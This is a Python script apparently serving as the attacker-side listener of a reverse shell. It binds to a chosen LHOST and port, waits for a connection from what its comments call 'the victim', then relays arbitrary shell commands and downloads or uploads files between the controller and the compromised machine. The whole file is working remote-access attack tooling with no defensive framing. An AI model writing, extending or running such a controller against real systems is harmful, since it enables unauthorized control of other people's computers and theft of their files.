import socket
import sys
import time
import interface

#additional used commands: quit, download, upload
def send_commands(conn):
    client_response = str(conn.recv(4096))
    print(client_response)
    while True:
        try:
            cmd = raw_input()
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            elif cmd[:8] == 'download':
                conn.send(str.encode(cmd))
                down_file = cmd[9:]
                receive_file = True

                client_response = conn.recv(1024)
                if client_response.endswith(b"Requested file not found"):
                    print("Requested file not found on the client")
                    client_response = str(conn.recv(4096))
                    print(client_response)

                else:
                    with open(down_file, 'wb') as f:
                        while receive_file:
                            if client_response.endswith(b"EOFEOFEOFEOFEOF"):
                                print("Download completed")
                                data = client_response[:-15]
                                f.write(data)
                                f.close()
                                client_response = str(conn.recv(4096))
                                print(client_response)
                                receive_file = False
                            else:
                                f.write(client_response)
                                client_response = conn.recv(1024)

            elif cmd[:6] == 'upload':
                file_name = cmd[7:]

                try:
                    with open(file_name, 'rb') as f:
                        conn.send(str.encode(cmd))
                        sending = True
                        while sending:
                            file_to_send = f.read(1024)
                            if file_to_send == b'':
                                print("Upload completed")
                                f.close()
                                time.sleep(0.3)
                                conn.send(str.encode("EOFEOFEOFEOFEOF"))
                                client_response = str(conn.recv(4096))
                                print(client_response)
                                sending = False
                            else:
                                conn.send(file_to_send)
                except FileNotFoundError:
                    print("File not found")
                    print(client_response)

            elif len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(4096))
                print(client_response)
            elif cmd == '':
                client_response = str(conn.recv(10000000))
                print(client_response)
                
          
        except (ConnectionResetError, ConnectionAbortedError):
            print("Connection with host was lost")
            s.listen(1)
            print("Listening on " + str(host) + ":" + str(port))
            conn, address = s.accept()
            print("Connection has been established: " + "IP " + address[0] + " |  Port " + str(address[1]))
            send_commands(conn)


#def graphic():
    #interface.gui()


#Create connection with the victim + send commands
def socket_create():
    try:
        global s
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
    try:
        s.bind((host, port))
        s.listen(1)
        print("Listening on " + str(host) + ":" + str(port))
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " |  Port " + str(address[1]))
    time.sleep(0.5)
    send_commands(conn)

def main():
    global host
    try:
            host = raw_input("Enter your local host IP > ")
            print("Set LHOST: %s" % host)
            global port
            port = int(raw_input("Enter the port > "))
            print("Set LPORT: %s" % port)
            socket_create()
    except (ValueError, OSError, OverflowError):
        print("You entered invalid data")
        main()


if __name__ == "__main__":
    #graphic()
    main()
